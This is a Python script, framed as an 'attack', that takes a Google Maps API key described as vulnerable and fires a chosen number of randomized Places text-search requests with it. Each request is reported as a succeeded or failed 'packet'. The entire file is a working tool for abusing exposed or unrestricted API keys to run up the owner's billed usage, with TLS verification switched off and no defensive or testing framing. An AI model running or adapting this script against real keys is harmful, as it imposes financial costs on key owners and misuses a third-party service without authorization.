#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def get_searchterm():
    city = open("datasets/cities.txt","r")
    building = open("datasets/buildings.txt","r")

    city_line = next(city)
    building_line = next(building)

    for i, c_line in enumerate(city,2):
        if random.randrange(i):
            continue
        city_line = c_line

    for j, b_line in enumerate(building,2):
        if random.randrange(j):
            continue
        building_line = b_line

    return f"{building_line.strip()}+in+{city_line.strip()}".replace(" ","+")

def generate_url(apikey, term):
    return f"https://maps.googleapis.com/maps/api/place/textsearch/json?query={term}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to text search-places: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey, get_searchterm())
        print(url)
        response = requests.get(url, verify=False)
        if response.text.find("error_message") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

